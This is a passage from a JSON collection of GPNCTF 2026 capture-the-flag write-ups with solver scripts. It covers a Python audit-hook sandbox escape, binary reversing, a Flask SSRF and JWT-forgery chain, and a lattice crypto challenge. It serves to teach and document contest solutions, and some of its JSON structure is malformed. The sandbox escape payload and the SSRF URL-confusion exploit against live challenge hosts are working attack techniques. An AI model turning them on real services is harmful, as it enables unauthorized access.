      "code": "source /home/kali/tools/ctf/bin/activate\npython exploit.py"
    },
    {
      "title": "Catatan",
      "content": "Challenge ini punya surface memory corruption yang nyata di `_heapq`, jadi sangat masuk akal kalau solver awal mengarah ke UAF. Tetapi bug yang benar-benar fatal justru lebih sederhana: audit hook Python-level yang mengandalkan nama global yang bisa ditimpa ulang dari script user."
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (exploit.py):",
      "code": "from pwn import remote\r\nimport re\r\n\r\n\r\nHOST = \"glazed-meatball-dusted-with-shaved-bread-3sqp.gpn24.ctf.kitctf.de\"\r\nPORT = 443\r\n\r\n\r\nPAYLOAD = b\"\"\"p=_exit.__self__\r\n_exit=lambda x:None\r\np.system('/challenge/read_flag')\r\nEOF\r\n\"\"\"\r\n\r\n\r\ndef main() -> None:\r\n    io = remote(HOST, PORT, ssl=True, sni=HOST)\r\n    io.recvuntil(b'EOF\":\\n')\r\n    io.send(PAYLOAD)\r\n\r\n    out = io.recvall(timeout=5).decode(errors=\"ignore\")\r\n    print(out, end=\"\")\r\n\r\n    match = re.search(r\"GPNCTF\\\\{[^}\\\\n]+\\\\}\", out)\r\n    if match:\r\n        print(f\"\\n[+] Flag: {match.group(0)}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{sO_M4Ny_wAys_TO_LeAk_1N_N0Rma1_PyThOn_UAf_OlD_8UT_G0Ld}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-rev-deliveryproblem",
  "title": "Konigsberg Delivery Problem",
  "ctfName": "GPNCTF 2026",
  "category": "Reverse",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Binary yang disediakan cuma `cartographer`.",
  "problemDescription": "Fungsi `main` melakukan `scanf(\"%hhd;\")` sebanyak 250 kali. Artinya program menunggu 250 bilangan signed byte yang dipisahkan `;`.\n\nSetelah semua angka dibaca, `main` memanggil fungsi besar bernama `cfg`. Di dalam `cfg` ada pola yang berulang:\n\n1. Sebuah byte counter pada stack di-increment.\n2. Byte input saat ini dibaca.\n3. Nilainya dibandingkan dengan batas maksimum tertentu.\n4. Jika nilai input masih dalam batas, nilai itu dipakai sebagai indeks ke jump table berikutnya.\n5. Jika nilai input lebih besar dari batas node saat ini, eksekusi lompat ke blok akhir yang memanggil `check_instance`.\n\n`check_instance` tidak memverifikasi urutan secara rumit. Ia hanya mengecek apakah seluruh 250 byte counter di stack sudah non-zero. Kalau semuanya pernah disentuh minimal satu kali, program membuka `/flag` dan mencetak isinya. Kalau ada satu saja yang nol, program mencetak `Not quite, try again!`.\n\nJadi inti challenge-nya:\n\n- ada 250 state/node,\n- setiap state menandai dirinya sebagai \"visited\",\n- input valid memilih state berikutnya lewat jump table,\n- input invalid menghentikan traversal dan memicu pengecekan,\n- flag keluar kalau seluruh 250 state sudah dikunjungi setidaknya sekali.",
  "tools": [],
  "analysis": "",
  "solution": [
    {
      "title": "Bentuk graph",
      "content": "Setelah jump table diekstrak, fungsi `cfg` ternyata membentuk graph terarah dengan 250 node. Node awal adalah state pertama di `0x1210`. Masing-masing node punya banyak edge keluar, dan graph-nya strongly connected.\n\nKarena tujuan `check_instance` hanya memastikan semua node pernah dikunjungi, problem ini berubah menjadi:\n\n1. cari path yang mengunjungi semua 250 node tepat sebelum exit,\n2. lalu kirim satu byte yang lebih besar dari batas node terakhir supaya eksekusi masuk ke `check_instance`.\n\nSaya parse graph langsung dari binary:\n\n- alamat state ke-`i` mengikuti pola blok 0x30 byte,\n- setiap blok punya `cmp rdx, imm8` yang memberi tahu batas input valid untuk state itu,\n- blok juga punya `lea` ke base jump table,\n- setiap entry jump table berisi offset relatif ke state berikutnya.\n\nDengan representasi itu, saya jalankan DFS greedy sederhana. Karena graph sangat padat, path Hamiltonian ditemukan sangat cepat tanpa perlu angr atau SMT solver."
    },
    {
      "title": "Payload final",
      "content": "DFS menghasilkan 249 transisi valid yang melewati semua 250 node. Setelah itu saya tambahkan satu nilai invalid untuk node terakhir, sehingga `cfg` keluar ke `check_instance`.\n\nPayload akhirnya adalah:",
      "code": "15;31;54;15;52;47;44;79;8;34;76;32;23;51;67;45;67;70;43;34;83;44;12;7;49;83;12;72;41;3;53;45;72;42;14;69;71;89;94;56;81;5;59;85;66;43;23;75;10;74;45;0;30;47;30;38;5;4;72;15;11;4;84;34;35;17;34;77;53;79;54;42;70;27;6;48;0;72;87;56;72;12;8;57;29;58;68;81;39;34;74;81;43;72;35;15;24;48;35;78;25;12;16;16;100;1;87;90;16;4;66;45;96;56;74;27;17;77;74;94;74;50;45;40;75;57;94;69;75;62;37;8;24;94;86;81;49;52;57;19;45;35;98;108;24;67;43;44;93;24;84;46;94;4;20;39;54;85;31;54;77;0;61;9;70;26;103;72;110;24;55;16;15;3;88;25;95;79;64;63;83;104;79;15;48;27;35;103;37;91;104;5;40;6;75;63;33;25;96;0;15;37;56;4;22;112;16;55;40;53;51;86;17;37;41;0;54;30;30;5;12;27;9;78;41;95;58;62;30;94;40;75;18;63;78;54;54;67;42;90;12;46;108;32;67;94;78;67;34;112"
    },
    {
      "title": "Catatan remote",
      "content": "Saat koneksi pertama saya sempat mendapat `Connection refused` dari `ncat --ssl`. Masalahnya ternyata resolusi awal mengarah ke IPv6/NAT64, sementara service IPv4-nya yang stabil. Karena itu solver final memakai `socket.create_connection()` biasa yang menuju alamat host aktif dan dibungkus TLS dengan `ssl`."
    },
    {
      "title": "Menjalankan solver",
      "content": "Output remote yang berhasil:",
      "code": "python3 solve.py"
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nimport subprocess\r\n\r\n\r\nHOST = \"slow-roasted-apple-infused-with-braised-truffle-oil-iau4.gpn24.ctf.kitctf.de\"\r\nPORT = 443\r\n\r\nPAYLOAD = (\r\n    \"15;31;54;15;52;47;44;79;8;34;76;32;23;51;67;45;67;70;43;34;83;44;12;7;\"\r\n    \"49;83;12;72;41;3;53;45;72;42;14;69;71;89;94;56;81;5;59;85;66;43;23;75;\"\r\n    \"10;74;45;0;30;47;30;38;5;4;72;15;11;4;84;34;35;17;34;77;53;79;54;42;70;\"\r\n    \"27;6;48;0;72;87;56;72;12;8;57;29;58;68;81;39;34;74;81;43;72;35;15;24;\"\r\n    \"48;35;78;25;12;16;16;100;1;87;90;16;4;66;45;96;56;74;27;17;77;74;94;74;\"\r\n    \"50;45;40;75;57;94;69;75;62;37;8;24;94;86;81;49;52;57;19;45;35;98;108;24;\"\r\n    \"67;43;44;93;24;84;46;94;4;20;39;54;85;31;54;77;0;61;9;70;26;103;72;110;\"\r\n    \"24;55;16;15;3;88;25;95;79;64;63;83;104;79;15;48;27;35;103;37;91;104;5;\"\r\n    \"40;6;75;63;33;25;96;0;15;37;56;4;22;112;16;55;40;53;51;86;17;37;41;0;\"\r\n    \"54;30;30;5;12;27;9;78;41;95;58;62;30;94;40;75;18;63;78;54;54;67;42;90;\"\r\n    \"12;46;108;32;67;94;78;67;34;112\\n\"\r\n)\r\n\r\n\r\ndef main() -> None:\r\n    result = subprocess.run(\r\n        [\"ncat\", \"-4\", \"--ssl\", HOST, str(PORT)],\r\n        input=PAYLOAD,\r\n        text=True,\r\n        capture_output=True,\r\n        check=False,\r\n    )\r\n    print(result.stdout, end=\"\")\r\n    if result.returncode != 0:\r\n        raise SystemExit(result.stderr.strip() or result.returncode)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-rev-myfavoriteingredient",
  "title": "My favorite ingredient —",
  "ctfName": "GPNCTF 2026",
  "category": "Reverse",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Writeup for challenge My favorite ingredient —",
  "problemDescription": "Challenge ini berupa binary ELF 64-bit dengan satu argumen input. Program hanya menerima flag sepanjang 64 karakter, lalu menjalankan verifier matematis yang terlihat seperti operasi vector/matrix besar.\n\nFlag yang didapat:\n\n```text\nGPNCTF{ju57_oNE_ON5TRUCt1oNs_Is_a1l_yOu_n33d_MaY8e123979AFKfNdh}\n```",
  "tools": [],
  "analysis": "Di `main`, program melakukan tiga hal penting:\n\n1. Mengecek panjang input harus `0x40` atau 64 byte.\n2. Menyalin konstanta matrix berukuran `0x1000` byte dari `.rodata`.\n3. Menyalin target 64 byte dari `.rodata`, lalu memanggil `verify_flag`.\n\nPotongan penting dari `verify_flag`:\n\n```asm\ncall matvec_mul_vectorized\n...\nnot cl\ncmp BYTE PTR [rsp+i], cl\n```\n\nArtinya output dari `matvec_mul_vectorized` dibandingkan dengan komplemen bitwise dari target yang tersimpan di binary.\n\nTarget asli berada di offset virtual/file `0x32170`, sehingga target yang harus dicapai adalah:\n\n```python\ntarget = bytes((~b) & 0xff for b in binary[0x32170:0x32170+64])\n```",
  "solution": [
    {
      "title": "Insight utama",
      "content": "Sebelum masuk ke `matvec_mul_vectorized`, input mengalami transformasi byte. Secara matematis transformasi awalnya ekuivalen dengan:\n\n\n\nLalu di awal `matvec_mul_vectorized`, byte tersebut diproses lagi menjadi:\n\n\n\nJika digabung:\n\n\n\nJadi dua transformasi itu saling membatalkan. Inilah “magic ingredient”-nya: operasi terlihat rumit, tapi byte yang masuk ke operasi matrix sebenarnya kembali menjadi byte input asli.",
      "code": "t = 197 * input + 101 mod 256"
    },
    {
      "title": "Strategi penyelesaian",
      "content": "Alih-alih menulis ulang seluruh `matvec_mul_vectorized` yang sangat panjang, saya membuat oracle lokal dari binary itu sendiri.\n\nPatch dilakukan tepat setelah `matvec_mul_vectorized` selesai dipanggil. Pada titik itu, buffer output 64 byte berada di stack. Kode compare diganti menjadi syscall `write(1, rsp, 64)`, sehingga binary patched akan mencetak output internal verifier untuk input apa pun.\n\nPatch bytes yang digunakan:\n\n\n\nDengan oracle ini, output verifier bisa dianggap sebagai fungsi:\n\n\n\nSetelah diuji, fungsi ini bersifat affine terhadap byte input dalam ring `mod 256`:\n\n\n\nSaya memakai `base = b\"A\" * 64`, lalu mengubah satu byte sebanyak `+1` untuk mendapatkan setiap kolom matrix `A`:\n\n\n\nSetelah 64 kolom didapat, sistem linear berikut diselesaikan:\n\n\n\nKarena modulusnya 256, pivot yang bisa diinvers adalah nilai ganjil. Matrix ternyata full-rank dengan pivot ganjil, sehingga bisa diselesaikan memakai eliminasi Gauss modulo 256.\n\nHasil akhirnya:",
      "code": "mov eax, 1\nmov edi, 1\nmov rsi, rsp\nmov edx, 64\nsyscall\nadd rsp, 0x80\npop rbx\nret"
    },
    {
      "title": "Validasi",
      "content": "Flag hasil solve kemudian diuji ke binary asli:\n\n\n\nOutput:",
      "code": "./my-favorite-ingredient 'GPNCTF{ju57_oNE_ON5TRUCt1oNs_Is_a1l_yOu_n33d_MaY8e123979AFKfNdh}'"
    },
    {
      "title": "Script solve",
      "content": "Script final ada di `solve.py`. Script tersebut:\n\n1. Membuat oracle patched dari binary asli.\n2. Mengambil target 64 byte dari `.rodata`.\n3. Membangun matrix affine modulo 256 memakai oracle.\n4. Menyelesaikan sistem linear modulo 256.\n5. Memvalidasi flag ke binary asli.\n6. Mencetak flag.\n\nJalankan:\n\n\n\nOutput:",
      "code": "python3 solve.py"
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport subprocess\r\nimport os\r\n\r\nROOT = Path(__file__).resolve().parent\r\nBIN = ROOT / \"my-favorite-ingredient\"\r\nORACLE = ROOT / \".mfi_oracle\"\r\n\r\n# Patch verify_flag right after matvec_mul_vectorized returns.\r\n# Original code compares the 64-byte output on stack with ~target.\r\n# This patch writes those 64 bytes to stdout, then returns success.\r\ndef build_oracle():\r\n    data = bytearray(BIN.read_bytes())\r\n    patch = bytes.fromhex(\r\n        \"b801000000\"      # mov eax, 1        ; sys_write\r\n        \"bf01000000\"      # mov edi, 1        ; stdout\r\n        \"4889e6\"          # mov rsi, rsp      ; output buffer\r\n        \"ba40000000\"      # mov edx, 64\r\n        \"0f05\"            # syscall\r\n        \"4881c480000000\"  # add rsp, 0x80\r\n        \"5b\"              # pop rbx\r\n        \"c3\"              # ret\r\n    )\r\n    off = 0x1209\r\n    data[off:off + len(patch)] = patch\r\n    ORACLE.write_bytes(data)\r\n    ORACLE.chmod(0o755)\r\n\r\n\r\ndef oracle(arg: bytes) -> bytes:\r\n    return subprocess.check_output([bytes(ORACLE), arg])[:64]\r\n\r\n\r\ndef solve_mod_256(A, b):\r\n    n = len(b)\r\n    M = [A[i][:] + [b[i]] for i in range(n)]\r\n    where = [-1] * n\r\n    row = 0\r\n\r\n    for col in range(n):\r\n        pivot = None\r\n        for r in range(row, n):\r\n            # Only odd values are invertible modulo 256.\r\n            if M[r][col] & 1:\r\n                pivot = r\r\n                break\r\n        if pivot is None:\r\n            continue\r\n\r\n        M[row], M[pivot] = M[pivot], M[row]\r\n        inv = pow(M[row][col], -1, 256)\r\n        M[row] = [(v * inv) & 0xff for v in M[row]]\r\n\r\n        for r in range(n):\r\n            if r != row and M[r][col]:\r\n                factor = M[r][col]\r\n                M[r] = [(M[r][c] - factor * M[row][c]) & 0xff for c in range(n + 1)]\r\n\r\n        where[col] = row\r\n        row += 1\r\n\r\n    if row != n:\r\n        raise RuntimeError(f\"matrix is not fully invertible modulo 256, rank={row}\")\r\n\r\n    x = [0] * n\r\n    for col, r in enumerate(where):\r\n        x[col] = M[r][n]\r\n    return x\r\n\r\n\r\ndef main():\r\n    build_oracle()\r\n\r\n    raw = BIN.read_bytes()\r\n    target = bytes((~x) & 0xff for x in raw[0x32170:0x32170 + 64])\r\n\r\n    # Use a printable non-zero base so it can be passed as argv.\r\n    base = bytearray([0x41] * 64)\r\n    y0 = oracle(bytes(base))\r\n\r\n    # The verifier is affine over Z/256Z:\r\n    #   y = y0 + A * (x - base) mod 256\r\n    cols = []\r\n    for j in range(64):\r\n        test = base.copy()\r\n        test[j] = (test[j] + 1) & 0xff\r\n        y = oracle(bytes(test))\r\n        cols.append([(y[i] - y0[i]) & 0xff for i in range(64)])\r\n\r\n    A = [[cols[j][i] for j in range(64)] for i in range(64)]\r\n    rhs = [(target[i] - y0[i]) & 0xff for i in range(64)]\r\n    delta = solve_mod_256(A, rhs)\r\n\r\n    flag = bytearray(base)\r\n    for i, d in enumerate(delta):\r\n        flag[i] = (flag[i] + d) & 0xff\r\n\r\n    flag = bytes(flag)\r\n    check = subprocess.check_output([bytes(BIN), flag]).decode(errors=\"replace\").strip()\r\n    if check != \"Correct flag!\":\r\n        raise RuntimeError(f\"verification failed: {check}\")\r\n\r\n    print(flag.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{ju57_oNE_ON5TRUCt1oNs_Is_a1l_yOu_n33d_MaY8e123979AFKfNdh}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-rev-specctf",
  "title": "SpecCTF",
  "ctfName": "GPNCTF 2026",
  "category": "Reverse",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Flag:",
  "problemDescription": "Binary `specCTF` adalah ELF 64-bit PIE C++ yang tidak stripped. Program menerima argumen command line, panjangnya harus kelipatan 8, lalu memeriksa input per blok `uint64_t`.\n\nOutput yang terlihat hanya `NOPE` atau `CORRECT`, tetapi pembandingnya sengaja dibuat aneh memakai pola Spectre/cache-timing. Setelah disassembly, bagian side-channel itu tidak perlu dijalankan sebagai oracle karena logika sebenarnya tetap terlihat jelas.",
  "tools": [],
  "analysis": "Di `main`, setiap 8 byte input dimuat ke register `r14`, lalu nilai target dari global `ENC` dimuat ke `r15`.\n\nPotongan pentingnya:\n\n- `ENC[i]` dimuat sebagai qword ke `r15`\n- `input[i:i+8]` dimuat sebagai qword little-endian ke `r14`\n- fungsi `specte_byte(0x1337, 0x1337)` dipakai untuk menentukan apakah blok benar\n\nFungsi `specte_byte` melakukan klasifikasi timing berdasarkan fungsi `specEnvTime`. Di fungsi itu ada kondisi inti:\n\n```c\nif (hashy(r14) == r15) {\n    touch arr2[0x2800];\n} else {\n    touch arr2[0xa200];\n}\n```\n\nJadi validasi sebenarnya adalah:\n\n```text\nhashy(input_qword) == ENC[i]\n```\n\nFungsi `hashy`:\n\n```c\nx ^= x >> 33;\nx *= 0xf451af975d152cad;\nx ^= x >> 33;\nx ^= 0xc2ceaade1a351c23;\nx ^= x >> 33;\n```\n\nSemua operasi di atas reversible modulo 2^64:\n\n- `x ^= x >> 33` bisa dibalik karena shift lebih dari setengah ukuran word\n- perkalian bisa dibalik karena konstanta ganjil punya modular inverse modulo 2^64\n- xor konstanta tinggal di-xor ulang\n\n`ENC` berukuran 56 byte, tetapi qword terakhir bernilai nol. Program hanya memeriksa sebanyak `strlen(input) / 8` blok dan tidak memaksa semua elemen `ENC` dipakai. Enam qword non-zero pertama sudah menghasilkan flag lengkap sepanjang 48 byte.",
  "solution": [
    {
      "title": "Eksploitasi",
      "content": "Solver membalik `hashy` untuk setiap qword `ENC`, lalu menyusun kembali hasilnya sebagai little-endian bytes.\n\nValidasi lokal:",
      "code": "$ python3 solve.py\nGPNCTF{thIs_MEal_IS_5p3cUlATiv31Y_DeLic1ous!!!!}\nCORRECT"
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nimport struct\r\nimport subprocess\r\n\r\n\r\nMASK = (1 << 64) - 1\r\nA = 0xF451AF975D152CAD\r\nB = 0xC2CEAADE1A351C23\r\nINV_A = pow(A, -1, 1 << 64)\r\n\r\n# Global ENC dari .data, hanya 6 qword non-zero yang diperlukan.\r\nENC = bytes.fromhex(\r\n    \"e57571e9ec9075ee\"\r\n    \"7a8b0186fbf162ff\"\r\n    \"edae17e7fbe4eb6c\"\r\n    \"c171d16043214cfa\"\r\n    \"1f06f91976d4aec1\"\r\n    \"1f08274258dd79ae\"\r\n)\r\n\r\n\r\ndef undo_xor_shift_right(value: int, shift: int = 33) -> int:\r\n    return (value ^ (value >> shift)) & MASK\r\n\r\n\r\ndef invert_hashy(value: int) -> int:\r\n    value = undo_xor_shift_right(value)\r\n    value ^= B\r\n    value = undo_xor_shift_right(value)\r\n    value = (value * INV_A) & MASK\r\n    value = undo_xor_shift_right(value)\r\n    return value\r\n\r\n\r\ndef main() -> None:\r\n    blocks = struct.unpack(\"<6Q\", ENC)\r\n    flag = b\"\".join(struct.pack(\"<Q\", invert_hashy(block)) for block in blocks)\r\n    print(flag.decode())\r\n\r\n    # Local validation, ignored if the binary is absent.\r\n    try:\r\n        result = subprocess.run(\r\n            [\"./specCTF\", flag],\r\n            stdout=subprocess.PIPE,\r\n            stderr=subprocess.PIPE,\r\n            timeout=30,\r\n            check=False,\r\n        )\r\n        print(result.stdout.decode(errors=\"replace\").strip())\r\n    except FileNotFoundError:\r\n        pass\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{thIs_MEal_IS_5p3cUlATiv31Y_DeLic1ous!!!!}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-web-fancyfoodnotifications",
  "title": "Fancy food notifications",
  "ctfName": "GPNCTF 2026",
  "category": "Web",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Flag:",
  "problemDescription": "Challenge ini adalah aplikasi Flask untuk membuat order makanan. User mengirim `url`, lalu server akan melakukan request ke URL itu sebagai notifikasi ketika makanan selesai.\n\nTarget menariknya ada di endpoint `/vip-meal`. Endpoint ini hanya mengembalikan flag kalau:\n\n1. request datang dari `127.0.0.1`;\n2. header `Authorization` berisi JWT valid dengan claim `vip: true`.\n\nBug utamanya adalah kombinasi beberapa hal:\n\n- JWT key dibuat dari `random.randbytes()` setelah `random.seed()` dengan seed yang entropy-nya kecil.\n- Callback `/order` mengirim header `Authorization` ke URL user, jadi token normal bisa dileak lewat endpoint echo.\n- `requests` bisa mengganti header `Authorization` menjadi Basic auth jika URL berisi credentials.\n- Validasi hostname memakai `urllib.parse.urlparse()`, tetapi request final diproses oleh `requests` dengan normalisasi URL yang berbeda.",
  "tools": [],
  "analysis": "Di `app/app.py`, key JWT dibuat seperti ini:\n\n```python\nrandom.seed(f\"...{secrets.randbelow(2^256)}...\")\nkey = str(random.randbytes(32).hex())\n```\n\nDi Python, `2^256` bukan pangkat, tetapi XOR. Nilainya adalah `258`, jadi `secrets.randbelow(2^256)` hanya menghasilkan angka `0` sampai `257`. Artinya key JWT cuma punya 258 kemungkinan.\n\nEndpoint `/vip-meal` melakukan check ini:\n\n```python\nif request.remote_addr != \"127.0.0.1\":\n    return ..., 401\n\ntoken = request.headers.get(\"Authorization\", default=\"\").split(\" \")[-1]\ntoken = base64.b64decode(token).decode()\ntoken = ''.join(c for c in token if c.isalnum() or c in ['.', '=', '-', '_'])\ndecoded = jwt.decode(token, key, algorithms=[\"HS256\"])\n```\n\nJadi token yang diterima adalah base64 dari JWT, lalu karakter selain alnum, `.`, `=`, `-`, dan `_` dibuang.\n\nEndpoint `/order` membuat callback:\n\n```python\nr = requests.get(\n    url,\n    headers={\"Authorization\": f\"Bearer {generateToken(id)}\"},\n    allow_redirects=False,\n)\n```\n\nSebelum request, host divalidasi agar semua IP hasil resolve adalah global:\n\n```python\naddresses = socket.getaddrinfo(urlparse(url).hostname, 0)\nfor addr in addresses:\n    if not ipaddress.ip_address(addr[4][0]).is_global:\n        return REJECTED\n```",
  "solution": [
    {
      "title": "Leak Token Normal",
      "content": "Pertama saya kirim order ke endpoint echo:\n\n\n\nResponse callback disimpan di `/notification/<id>`, dan di sana terlihat header yang dikirim server:\n\n\n\nBase64 token itu berisi JWT:\n\n\n\nDengan token valid ini, saya brute-force 258 kemungkinan seed sampai signature cocok. Seed yang benar adalah varian `64`, dengan key:\n\n\n\nLalu saya buat JWT baru:",
      "code": "https://httpbin.org/anything"
    },
    {
      "title": "Bypass Header Authorization",
      "content": "Masalah berikutnya: SSRF dari `/order` selalu mengirim header:\n\n\n\nTetapi library `requests` punya perilaku penting: jika URL berisi credentials, misalnya:\n\n\n\nmaka `requests` akan menyiapkan Basic auth dan header `Authorization` bisa menjadi:\n\n\n\nIni cocok dengan parser `/vip-meal`, karena endpoint hanya mengambil bagian setelah spasi lalu melakukan base64 decode. Jika username di URL adalah JWT forged dan password kosong, Basic auth menjadi base64 dari:\n\n\n\nKarakter `:` akan dibuang oleh filter token, sehingga yang tersisa adalah JWT forged.",
      "code": "Authorization: Bearer <token vip=false>"
    },
    {
      "title": "Bypass Host Validation",
      "content": "Payload URL final:\n\n\n\nAlasannya:\n\n- `urlparse(url).hostname` melihat hostname sebagai `example.com`, sehingga validasi IP lolos karena `example.com` resolve ke IP global.\n- `requests` menormalisasi URL tersebut menjadi request ke:\n\n\n\n- credentials `<forged_jwt>:` membuat header menjadi Basic auth yang berisi JWT forged.\n\nDengan begitu request callback masuk ke `/vip-meal` dari localhost dan membawa token `vip: true`.",
      "code": "http://<forged_jwt>:@127.0.0.1\\@example.com/../vip-meal"
    },
    {
      "title": "Script Inti",
      "content": "Potongan eksploit final:\n\n\n\nOutput:",
      "code": "import re\nimport time\nimport urllib.parse\nimport requests\n\nbase = \"https://smoked-brisket-stuffed-with-roasted-miso-ajss.gpn24.ctf.kitctf.de\"\nforged = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2aXAiOnRydWUsImlkIjoidXV4MG8zNDdkMCJ9.2-C1H7swW0YPGvXoqgeCdk4wAKo1uWUmgeKU0sVWsDE\"\n\nuser = urllib.parse.quote(forged, safe=\"\")\nurl = f\"http://{user}:@127.0.0.1\\\\@example.com/../vip-meal\"\n\nr = requests.post(base + \"/order\", data={\"url\": url})\norder_id = re.search(r\"/notification/([a-z0-9]{10})\", r.text).group(1)\n\nwhile True:\n    time.sleep(1)\n    j = requests.get(base + \"/notification/\" + order_id).json()\n    flag = re.search(r\"GPNCTF\\\\{[^}]+\\\\}\", j.get(\"message\", \"\"))\n    if flag:\n        print(flag.group(0))\n        break"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{and_as_always_thE_PrOB13M_W45_dNS}",
  "lessonsLearned": []
}
    ],
    "terminalOutputs": [],
    "flag": "GPNCTF{and_as_always_thE_PrOB13M_W45_dNS}",
    "lessonsLearned": []
  }
,
{
  "id": "gpnctf2026-crypto-justfollowtherecipe",
  "title": "GPNCTF 2026 — Just Follow the Recipe",
  "ctfName": "GPNCTF 2026",
  "category": "Crypto",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "**Category:** Crypto  \n**Challenge:** Just Follow the Recipe  \n**Flag:** `GPNCTF{COMp1LEr5_ARE_Y0uR_Fr1eND_7Hey_WoU1D_nEV3r}`",
  "problemDescription": "**Category:** Crypto  \n**Challenge:** Just Follow the Recipe  \n**Flag:** `GPNCTF{COMp1LEr5_ARE_Y0uR_Fr1eND_7Hey_WoU1D_nEV3r}`\n\n---",
  "tools": [],
  "analysis": "The startup output gives a target vector\n\n$$y = A s \\pmod{12289}.$$\n\nThe service also allows us to hash user-controlled vectors. If the hash function were consistent across all menu paths, recovering the full matrix $A$ would be straightforward.\n\nLet $e_j$ be the $j$-th standard basis vector:\n\n$$e_j = (0,\\dots,0,1,0,\\dots,0).$$\n\nThen $A e_j$ is exactly the $j$-th column of $A$.\n\nTherefore, by querying the hash oracle on $e_0, e_1, \\dots, e_{163}$, we should be able to recover the matrix column by column.\n\nHowever, using menu option `1` for this failed. The recovered matrix looked valid, but it did not satisfy the target hash equation. That meant the failure was not caused by lattice reduction or bad parsing. **The oracle itself was inconsistent.**\n\n---",
  "solution": [
    {
      "title": "TL;DR",
      "content": "The challenge initially looks like a bounded modular linear algebra problem. The hidden recipe is a vector of 164 small decimal digits, and the service exposes hashes that are linear combinations modulo $12289$.\n\nThe actual bug is not in the mathematics alone. The binary behaves differently depending on which menu path is used. The source-level logic suggests a normal matrix multiplication routine, but the compiled binary uses inconsistent multiplication paths. By recovering the real linear maps used by the binary, combining the resulting modular equations, and solving the bounded system with lattice reduction, we can recover the secret recipe and submit it to obtain the flag.\n\n---"
    },
    {
      "title": "Challenge Overview",
      "content": "The service prints a target hash at startup and exposes this menu:\n\n\n\nThe goal is to recover the hidden recipe vector $s$, then submit it through option `0`.\n\nThe recipe vector has length\n\n$$m = 164.$$\n\nEach coordinate is a decimal digit:\n\n$$s_i \\in \\{0, 1, \\dots, 9\\}.$$\n\nThe hash output has length\n\n$$n = 64.$$\n\nThe modulus is\n\n$$q = 12289.$$\n\nSo the cryptographic core can be modeled as a modular linear map:\n\n$$y = A s \\pmod{q},$$\n\nwhere\n\n$$A \\in \\mathbb{Z}_q^{64 \\times 164}, \\quad s \\in \\{0,\\dots,9\\}^{164}, \\quad y \\in \\mathbb{Z}_q^{64}.$$\n\nAt first glance, this is an underdetermined linear system over $\\mathbb{Z}_q$. Since there are only 64 equations and 164 unknowns, direct modular linear algebra is not enough. The useful constraint is that every coordinate of $s$ is very small.\n\n---",
      "code": "0) Check your work\n1) Hash a single vector\n2) Hash multiple vectors\n3) Exit"
    },
    {
      "title": "The Binary Was the Hint",
      "content": "The challenge description explicitly says:\n\n> The binary is there for a reason, LOOK at it.\n\nThat was the key hint. The source-level logic suggests a normal hash operation based on matrix multiplication. The compiled binary, however, does not behave as if all menu options call the same linear map.\n\nEmpirically, the behavior is:\n\n- Menu option `1` does **not** match the startup target hash path.\n- Menu option `2` with $n = 1$ **matches** the startup target hash path.\n- Menu option `2` with larger batches behaves differently again.\n\nSo the correct way to recover the matrix for the startup target is not:\n\n\n\nbut:\n\n\n\nThis gives the matrix used by the target hash. I will call it $A_{\\mathrm{multi}}$. It satisfies\n\n$$y_{\\mathrm{multi}} = A_{\\mathrm{multi}} \\, s \\pmod{q}.$$\n\nMenu option `1` is still useful, though. It gives another linear map, $A_{\\mathrm{single}}$, together with another hash of the same secret:\n\n$$y_{\\mathrm{single}} = A_{\\mathrm{single}} \\, s \\pmod{q}.$$\n\nThe bug gives us **two different systems** involving the same unknown bounded vector $s$.\n\n---",
      "code": "1) Hash a single vector"
    },
    {
      "title": "Recovering the Linear Maps",
      "content": "For every index $j$, query the corresponding oracle with $e_j$.\n\nFor the target-compatible path:\n\n$$A_{\\mathrm{multi}}[:,j] = H_{\\mathrm{multi}}(e_j).$$\n\nFor the single-vector path:\n\n$$A_{\\mathrm{single}}[:,j] = H_{\\mathrm{single}}(e_j).$$\n\nAfter 164 basis queries for each path, we recover\n\n$$A_{\\mathrm{multi}} \\in \\mathbb{Z}_q^{64 \\times 164} \\quad \\text{and} \\quad A_{\\mathrm{single}} \\in \\mathbb{Z}_q^{64 \\times 164}.$$\n\nThe first system is\n\n$$A_{\\mathrm{multi}} \\, s \\equiv y_{\\mathrm{multi}} \\pmod{q}.$$\n\nThe second system is\n\n$$A_{\\mathrm{single}} \\, s \\equiv y_{\\mathrm{single}} \\pmod{q}.$$\n\nCombining both systems gives\n\n$$A' s \\equiv y' \\pmod{q},$$\n\nwhere\n\n$$A' = \\begin{bmatrix} A_{\\mathrm{multi}} \\\\ A_{\\mathrm{single}} \\end{bmatrix} \\in \\mathbb{Z}_q^{128 \\times 164}, \\qquad y' = \\begin{bmatrix} y_{\\mathrm{multi}} \\\\ y_{\\mathrm{single}} \\end{bmatrix} 